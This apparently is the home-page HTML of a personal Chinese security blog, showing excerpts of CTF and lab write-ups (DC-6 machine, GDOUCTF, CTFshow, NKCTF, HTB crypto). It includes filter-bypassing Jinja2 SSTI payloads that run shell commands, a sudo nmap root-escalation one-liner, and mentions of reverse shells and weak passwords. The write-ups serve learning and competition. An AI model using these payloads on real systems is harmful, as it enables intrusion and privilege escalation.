@@ -1,0 +1,1230 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Arcueid&#39;s BLOG</h1>
+                <h3></h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div id="home-posts-wrap" true ref="homePostsWrap">
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">DC-6靶机通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/21
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/28790b49d34a4f6a9dbfb3c459016658.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e498790d905f451b9ef93877cc7d3a05.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>发现无法访问web<br>加个hosts<br><img src="https://img-blog.csdnimg.cn/75398b9fcbd64e47bdbab59e3637f972.png" alt="在这里插入图片描述"><br>这题类似那个dc2还是dc3,网站长的一样<br><img src="https://img-blog.csdnimg.cn/59cd4b9ce9f746a8b158c0f6f9559c16.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/c5894d31c6ee48c380e856fcb187ed97.png" alt="在这里插入图片描述"><br>wordPress5.1.1<br>上wpscan扫<br>enumrate一下user 看看能不能弱口令<br>测了wp给的那几个用户,都不能弱口令,dirsearch也没扫到什么有价值的路径<br>尝试ssh弱口令<br>没爆出来,回官网看了下描述<br><img src="https://img-blog.csdnimg.cn/5f2193d7f0fa408dbe4e7e1b6a6080e5.png" alt="在这里插入图片描述"><br>确实是弱口令,但是我的字典差着了,给了提示就用吧<br><img src="https://img-blog.csdnimg.cn/f164d3474e204bf5af16ed2ae7992e7d.png" alt="在这里插入图片描述"><br>账号mark 密码 helpdesk01<br>登录后台<br><img src="https://img-blog.csdnimg.cn/2297c026c7de49e390cea88fa1f3ece0.png" alt="在这里插入图片描述"><br>尝试使用相关插件漏洞<br><img src="https://img-blog.csdnimg.cn/f1e17535c6ab4667864691bfa8df275e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/be2c598f6e5344888e2875d9ca6c2774.png" alt="在这里插入图片描述"><br>发包,然后拿到反弹的shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fbc678aa07754f649e1bbd466a7fce1e.png" alt="在这里插入图片描述"><br>用LinEnum.sh遍历脆弱性<br>没发现什么可以利用的<br>回去翻home目录ls -al看看文件<br>发现jens用户下有一个backup.sh<br><img src="https://img-blog.csdnimg.cn/c83c00e12a9844efb78be073bb7667ad.png" alt="在这里插入图片描述"><br>然而我们不是devs组的,没法写这个文件<br>继续看<br><img src="https://img-blog.csdnimg.cn/092758c8d43042488b6fc5547586110c.png" alt="在这里插入图片描述"><br>发现mark下有个stuff文件夹<br>其内存在一个txt文件<br>里面暴露了graham的账号<br>尝试ssh登录<img src="https://img-blog.csdnimg.cn/51924e6673a2464d84fabc90f405d254.png" alt="在这里插入图片描述"></p>
+<p>登录上发现graham是该组的<br>sudo -l看看有什么可用的<br><img src="https://img-blog.csdnimg.cn/0b4821478d57468bba33942bf1cd8e8f.png" alt="在这里插入图片描述"></p>
+<p>发现我们可以以jens的身份去运行backups.sh文件,且我们可以写这个sh文件,那么我们就可以拿一个jens用户的shell了<br><img src="https://img-blog.csdnimg.cn/1a26bb17bc0a4abeab0fefca202a1832.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b21a30ba7ed84aed91f3b86d47ce1261.png" alt="在这里插入图片描述"><br>可以尝试nmap提权<br><code>TF=$(mktemp) echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; $TF sudo nmap --script=$TF </code><br>这时候其实就拿到root权限的用户了,但是是看不见自己打了什么命令的,盲打一个优化shell<br><img src="https://img-blog.csdnimg.cn/6590c3a7571e41009eb640f10ea6c048.png" alt="在这里插入图片描述"><br>结束</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/linux/" style="color: #00a596">linux</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #03a9f4">运维</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ssh/" style="color: #ff7d73">ssh</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">2023 GDOUCTF 部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/16
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>js改个高分然后去送<img src="https://img-blog.csdnimg.cn/4f549bced35444c2b171ef7068ca3c78.png" alt="在这里插入图片描述"></p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/5bdcf86c3ab2457aa2ce4a2709a071a7.png" alt="在这里插入图片描述"></p>
+<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>看源码然后发put包<br><img src="https://img-blog.csdnimg.cn/a6ebfe910bf74701bfa85a18624d983a.png" alt="在这里插入图片描述"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h2><p>过滤挺多的 . _ 然后各种关键字<br>点用|attr()绕   下划线用拼接<br><img src="https://img-blog.csdnimg.cn/7175d0010532459e89192baf12aa5cec.png" alt="在这里插入图片描述"><br>payload如下<br><code>name=&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;&#123;% set bs=(a,a,dict(bas=a,e=b)|join(),a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;&#123;%set pp=dict(pop=a,en=b)|join %&#125;&#123;%set r=self|string|attr(geti)(18)%&#125;&#123;%set rd=dict(read=a)|join%&#125;&#123;%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('cat /flag')|attr('read')() )%&#125;</code></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><pre><code class="python">cipher = &#39;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#39;
+encryptedString = &quot;&quot;
+decryptedString = &#39;&#39;
+for char in cipher:
+    if char == &#39;!&#39;:
+        decryptedString += &#39;a&#39;
+    elif char == &#39;1&#39;:
+        decryptedString += &#39;b&#39;
+    elif char == &#39;)&#39;:
+        decryptedString += &#39;c&#39;
+    elif char == &#39;v&#39;:
+        decryptedString += &#39;d&#39;
+    elif char == &#39;m&#39;:
+        decryptedString += &#39;e&#39;
+    elif char == &#39;+&#39;:
+        decryptedString += &#39;f&#39;
+    elif char == &#39;q&#39;:
+        decryptedString += &#39;g&#39;
+    elif char == &#39;0&#39;:
+        decryptedString += &#39;h&#39;
+    elif char == &#39;c&#39;:
+        decryptedString += &#39;i&#39;
+    elif char == &#39;]&#39;:
+        decryptedString += &#39;j&#39;
+    elif char == &#39;(&#39;:
+        decryptedString += &#39;k&#39;
+    elif char == &#39;&#125;&#39;:
+        decryptedString += &#39;l&#39;
+    elif char == &#39;[&#39;:
+        decryptedString += &#39;m&#39;
+    elif char == &#39;8&#39;:
+        decryptedString += &#39;n&#39;
+    elif char == &#39;5&#39;:
+        decryptedString += &#39;o&#39;
+    elif char == &#39;$&#39;:
+        decryptedString += &#39;p&#39;
+    elif char == &#39;*&#39;:
+        decryptedString += &#39;q&#39;
+    elif char == &#39;i&#39;:
+        decryptedString += &#39;r&#39;
+    elif char == &#39;&gt;&#39;:
+        decryptedString += &#39;s&#39;
+    elif char == &#39;#&#39;:
+        decryptedString += &#39;t&#39;
+    elif char == &#39;&lt;&#39;:
+        decryptedString += &#39;u&#39;
+    elif char == &#39;?&#39;:
+        decryptedString += &#39;v&#39;
+    elif char == &#39;o&#39;:
+        decryptedString += &#39;w&#39;
+    elif char == &#39;^&#39;:
+        decryptedString += &#39;x&#39;
+    elif char == &#39;-&#39;:
+        decryptedString += &#39;y&#39;
+    elif char == &#39;_&#39;:
+        decryptedString += &#39;z&#39;
+    elif char == &#39;h&#39;:
+        decryptedString += &#39;0&#39;
+    elif char == &#39;w&#39;:
+        decryptedString += &#39;1&#39;
+    elif char == &#39;e&#39;:
+        decryptedString += &#39;2&#39;
+    elif char == &#39;9&#39;:
+        decryptedString += &#39;3&#39;
+    elif char == &#39;g&#39;:
+        decryptedString += &#39;4&#39;
+    elif char == &#39;z&#39;:
+        decryptedString += &#39;5&#39;
+    elif char == &#39;d&#39;:
+        decryptedString += &#39;6&#39;
+    elif char == &#39;~&#39;:
+        decryptedString += &#39;7&#39;
+    elif char == &#39;=&#39;:
+        decryptedString += &#39;8&#39;
+    elif char == &#39;x&#39;:
+        decryptedString += &#39;9&#39;
+    elif char == &#39;j&#39;:
+        decryptedString += &#39;!&#39;
+    elif char == &#39;:&#39;:
+        decryptedString += &#39;@&#39;
+    elif char == &#39;4&#39;:
+        decryptedString += &#39;#&#39;
+    elif char == &#39;b&#39;:
+        decryptedString += &#39;$&#39;
+    elif char == &#39;`&#39;:
+        decryptedString += &#39;%&#39;
+    elif char == &#39;l&#39;:
+        decryptedString += &#39;^&#39;
+    elif char == &#39;3&#39;:
+        decryptedString += &#39;&amp;&#39;
+    elif char == &#39;t&#39;:
+        decryptedString += &#39;*&#39;
+    elif char == &#39;6&#39;:
+        decryptedString += &#39;(&#39;
+    elif char == &#39;s&#39;:
+        decryptedString += &#39;)&#39;
+    elif char == &#39;n&#39;:
+        decryptedString += &#39;_&#39;
+    elif char == &#39;;&#39;:
+        decryptedString += &#39;+&#39;
+    elif char == &#39;\&#39;&#39;:
+        decryptedString += &#39;-&#39;
+    elif char == &#39;r&#39;:
+        decryptedString += &#39;=&#39;
+    elif char == &#39;k&#39;:
+        decryptedString += &#39;`&#39;
+    elif char == &#39;p&#39;:
+        decryptedString += &#39;~&#39;
+    elif char == &#39;\&quot;&#39;:
+        decryptedString += &#39;&#123;&#39;
+    elif char == &#39;&amp;&#39;:
+        decryptedString += &#39;&#125;&#39;
+    elif char == &#39;/&#39;:
+        decryptedString += &#39;[&#39;
+    elif char == &#39;\\&#39;:
+        decryptedString += &#39;]&#39;
+    elif char == &#39;2&#39;:
+        decryptedString +=  &#39;|&#39;
+    elif char == &#39;.&#39;:
+        decryptedString += &#39;:&#39;
+    elif char == &#39;%&#39;:
+        decryptedString += &#39;;&#39;
+    elif char == &#39;|&#39;:
+        decryptedString += &#39;&quot;&#39;
+    elif char == &#39;,&#39;:
+        decryptedString += &quot;&#39;&quot;
+    elif char == &#39;@&#39;:
+        decryptedString += &#39;&lt;&#39;
+    elif char == &#39;&#123;&#39;:
+        decryptedString += &#39;&gt;&#39;
+    elif char == &#39;u&#39;:
+        decryptedString += &#39;,&#39;
+    elif char == &#39;7&#39;:
+        decryptedString += &#39;.&#39;
+    elif char == &#39;y&#39;:
+        decryptedString += &#39;?&#39;
+    elif char == &#39;a&#39;:
+        decryptedString += &#39;/&#39;
+
+    print(decryptedString)
+</code></pre>
+<h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>先爆破得到key<br>有key就可以直接解密了</p>
+<pre><code class="python">import hashlib
+import string
+cipher = [&#39;200&#39;, &#39;161&#39;, &#39;198&#39;, &#39;157&#39;, &#39;173&#39;, &#39;169&#39;, &#39;199&#39;, &#39;150&#39;, &#39;105&#39;, &#39;163&#39;, &#39;193&#39;, &#39;175&#39;, &#39;173&#39;, &#39;194&#39;, &#39;135&#39;, &#39;131&#39;, &#39;135&#39;, &#39;225&#39;]
+flag = &#39;&#39;
+
+# key10 = &#39;b5e62abe84&#39;
+# string = string.ascii_letters
+# for i in string:
+#     for j in string:
+#         for k in string:
+#             for l in string:
+#                 seed = i+j+k+l
+#                 key = hashlib.md5(seed.encode()).hexdigest()
+#                 key = hashlib.md5(key.encode()).hexdigest()
+#                 if(key[:10] == key10):
+#                     print(key)
+
+# b5e62abe84bc8afbfd97c91a15aa0867
+
+key = &#39;b5e62abe84bc8afbfd97c91a15aa0867&#39;
+for i in range(len(cipher)):
+    flag += chr(int(cipher[i])-ord(key[i])) 
+print(flag)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">CTFSHOW愚人杯2023 部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>url是base64编码后的文件名<br>直接读个index.php<br>然后查看源码 解码base64</p>
+<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>过滤了斜杠,不能访问根目录了,考虑手动拼接一个<code>&#123;&#123;lipsum.__globals__.os.popen(lipsum.__globals__.__str__().__getitem__(34)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(22)~lipsum.__globals__.__str__().__getitem__(139)~lipsum.__globals__.__str__().__getitem__(288)~lipsum.__globals__.__str__().__getitem__(87)~lipsum.__globals__.__str__().__getitem__(24)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(54)).read()&#125;&#125;</code></p>
+<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>session伪造<br>伪造成admin登录后可以任意文件下载<br>下个app.py看源码<br><img src="https://img-blog.csdnimg.cn/27056cbdb97f4210938891d4598a2391.png" alt="在这里插入图片描述"><br>hello路由下存在ssti<br>可以tplmap一把梭<br>手动挡payload如下<br><code>request.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat /*&quot;).read()&#39;)</code></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="easy-pyc"><a href="#easy-pyc" class="headerlink" title="easy_pyc"></a>easy_pyc</h2><p>反编译得到py源码</p>
+<pre><code class="bash">uncompyle6 -o a.py  xxx.pyc
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/1215d68442904abf9363308072d5f3c3.png" alt="在这里插入图片描述"></p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>签到 解码base64即可</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>09改00然后bandzip修复<br><img src="https://img-blog.csdnimg.cn/2e79b84f20ab44e0a70adf19822a66ab.png" alt="在这里插入图片描述"><br>crc爆破宽高<br><img src="https://img-blog.csdnimg.cn/e2a0bd20912641338742680c0ff7dc03.png" alt="在这里插入图片描述"><br>修改高度为300<br>Ocr识别得到<br>5oSa5Lq66lqC5b+r5LmQ77yB77yB77yB解base64可以得到类似愚人节快乐的字符串<br>没什么用<br>Binwalk抽下图<br>发现里面还有一个压缩包<br>010打开</p>
+<p><img src="https://img-blog.csdnimg.cn/7de6f026102a47139a8d61d58d44df2c.png" alt="在这里插入图片描述"><br>在最后发现key的base64编码后的值,解码得到yurenjie<br>解压得到图片<br>crc 完了ocr<br><img src="https://img-blog.csdnimg.cn/ee8fc6602dea47be99d7858ac328f0bc.png" alt="在这里插入图片描述"></p>
+<h2 id="琴柳感"><a href="#琴柳感" class="headerlink" title="琴柳感"></a>琴柳感</h2><p><img src="https://img-blog.csdnimg.cn/62c27d36fd3d41de951b989b8c9c6045.png" alt="在这里插入图片描述"><br>观察发现除去开头和结尾独立的两句话 一共来回四句话<br>猜测四进制<br>四位一组要想能解出字母第一位必是1 因为4^3 &#x3D;64<br>那么所有的<code>你有没有感受到城市在分崩离析？</code>替换为1,另外三局遍历替换<br>最终得到的四进制的字符串</p>
+<pre><code class="bash">120313101212130312201233131313231320122112321213120213111203121112321213132012211232121311331321122112021311132212011221132112211133132212011221122312111230122112011232132112211230122112011232120212011331
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/49ebbc33ab614e36a0953f9c3c36f343.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #00a596">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/php/" style="color: #00a596">php</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/03/27/HTB%20crypto%20BabyEncryption/">
+        <h2 class="post-title">HTB crypto BabyEncryption</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>解压得到密文和加密逻辑<br>chall.py如下</p>
+<pre><code class="python">import string
+from secret import MSG
+
+def encryption(msg):
+    ct = []
+    for char in msg:
+        ct.append((123 * char + 18) % 256)
+    return bytes(ct)
+
+ct = encryption(MSG)
+f = open(&#39;./msg.enc&#39;,&#39;w&#39;)
+f.write(ct.hex())
+f.close()
+</code></pre>
+<p>ct是由msg中的每个字符乘123+18模256然后转16进制得到的<br>只需要转回bytes然后减18*d就能得到msg了</p>
+<p>其中d是123对256的逆元</p>
+<p>解密脚本如下</p>
+<pre><code class="python">import gmpy2
+d = gmpy2.invert(123,256)
+def de(msg):
+    pt = []
+    for char in msg:
+        char = char - 18
+        char = d * char % 256
+        pt.append(char)
+    return bytes(pt)
+
+with open(&#39;msg.enc&#39;) as f:
+    ct = bytes.fromhex(f.read())
+
+pt = de(ct)
+print(pt.decode())
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #ff7d73">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/03/27/HTB%20crypto%20BabyEncryption/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/03/27/NKCTF2023%20web%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">NKCTF2023 web部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><p><img src="https://img-blog.csdnimg.cn/bfa70902a1ee4a2a9d7350b34fdabcab.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3851c10c12b540cd9303dec18fdb98a8.png" alt="在这里插入图片描述"><br>Md5数组绕过 sha1强碰撞  php传值不能_但是[ ]会被视作_ 无字母数字rce 可以考虑取反</p>
+<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p><img src="https://img-blog.csdnimg.cn/a76edd3704434c18ab39bb0346450931.png" alt="在这里插入图片描述"><br>过滤了a,f,l,g和通配符<br>我考虑的是urldecode来绕<br><img src="https://img-blog.csdnimg.cn/2ece72e5162f4cc8aeefab7cecce6a27.png" alt="在这里插入图片描述"><br>这里注意<code>/</code>的url编码是<code>%2f</code><br>手动改成&#x2F;</p>
+<h1 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h1><p>无字母数字rce<br>禁用了很多危险函数,可以先开phpinfo看看<br><img src="https://img-blog.csdnimg.cn/017197b9df0c4fae975a7bb62efb71b6.png" alt="在这里插入图片描述"></p>
+<p>在phpinfo中发现shell_exec没有被禁用<br>但是shell_exec无回显,尝试重定向写出数据</p>
+<p><img src="https://img-blog.csdnimg.cn/dfc583cc2be847e58e1e63d78f4bf569.png" alt="在这里插入图片描述"></p>
+<h1 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h1><p>禅道,找个利用工具一把梭<br><img src="https://img-blog.csdnimg.cn/5065eaff0fe042afb795afd7f16193d8.png" alt="在这里插入图片描述"></p>
+<h1 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h1><p>弱口令admin admin<br>发现是dedecms5.7<br>找个exp<br><img src="https://img-blog.csdnimg.cn/17423411b14e4874adc5f54e7a8a59ee.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
